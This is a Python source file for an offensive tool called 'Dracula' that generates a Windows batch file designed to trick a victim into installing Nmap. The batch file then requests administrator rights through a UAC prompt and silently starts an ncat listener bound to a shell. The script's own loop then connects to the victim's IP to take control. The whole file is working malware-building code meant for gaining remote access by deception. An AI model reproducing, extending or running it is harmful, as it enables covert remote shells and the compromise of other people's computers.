import os
import subprocess
import argparse

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    print("""
     _____                       _       
    |  __ \                     | |      
    | |  | |_ __ __ _  ___ _   _| | __ _ 
    | |  | | '__/ _` |/ __| | | | |/ _` |
    | |__| | | | (_| | (__| |_| | | (_| |
    |_____/|_|  \__,_|\___|\__,_|_|\__,_|
                                        

""")
    print("[-] Use -h for help")

def generate_and_execute_batch(port, shell, ouput_file):

    batch_script = f"""@echo off

echo MSGBOX "This program requires the usage of Nmap, please continue with installation, you mayve prompted this messgae again" > %temp%\TEMPmessage.vbs
call %temp%\TEMPmessage.vbs
del %temp%\TEMPmessage.vbs /f /q

:: Netcat install (assume user doesnt have)
winget install -e --id Insecure.Nmap

:: Check for admin privileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting administrative privileges...
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\\elevate.vbs"
    echo UAC.ShellExecute "%~f0", "", "", "runas", 1 >> "%temp%\\elevate.vbs"
    cscript "%temp%\\elevate.vbs"
    del "%temp%\\elevate.vbs"
    exit /b
)
::Initialise Var
set PORT={port}
set SHELL={shell}

:: Run the main command 
echo Waiting...
echo Set objShell = CreateObject("WScript.Shell") > run_silent.vbs
echo objShell.Run "ncat -l -p %PORT% -e %SHELL%", 0, False >> run_silent.vbs

:: Run the VBScript 
cscript //nologo run_silent.vbs

:: Clean up the VBScript after execution
del run_silent.vbs

exit
"""
    try:
        with open(args.output+".bat", "w") as f:
            f.write(batch_script)
            print(f"\nSUCCESS!!! CREATED {args.output}.bat ")

    except subprocess.CalledProcessError as e:
        print(f"Error executing batch script: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")


clear_screen()
print_banner()

while True:
    dracula_cm = input("Dracula >> ").split()
    parser = argparse.ArgumentParser(description="Generate a reverse shell payload in form of a batch file.")
    parser.add_argument("-p", "--port", help="Port number for the reverse shell")
    parser.add_argument("-s", "--shell", help="Shell type ex- cmd, bash, powershell etc.")
    parser.add_argument("-o", "--output", help="Output file name.")
    parser.add_argument("-l", "--connect", action="store_true",help="Connects with the target if the target opened file.")
    parser.add_argument("-i", "--ip",help="Specify the ip adress of target")

    try:
        args = parser.parse_args(dracula_cm)
        if args.connect:
            if args.port: 
                print("Starting connect on port", args.port)
                try:
                    subprocess.run(["ncat", args.ip, str(args.port)], check=True)
                except subprocess.CalledProcessError as e:
                    print(f"Error starting connect: {e}")
                except FileNotFoundError:
                    print("Error: ncat not found. Please install ncat.")
                except Exception as e:
                    print(f"Error starting connect: {e}")

            else:
                print("Error: -l/--connect requires -p/--port to be specified.")
        elif args.port and args.shell and args.output: 
            generate_and_execute_batch(args.port, args.shell, args.output)
        elif args.port or args.shell or args.output:
            print("Please specify all -p, -s and -o flags to generate the batch file.")
        elif not dracula_cm:
            pass
        else:
            print("Invalid arguments. Use -h for help.")


    except SystemExit:
        pass
    except Exception as e:
        print(f"An error occurred: {e}")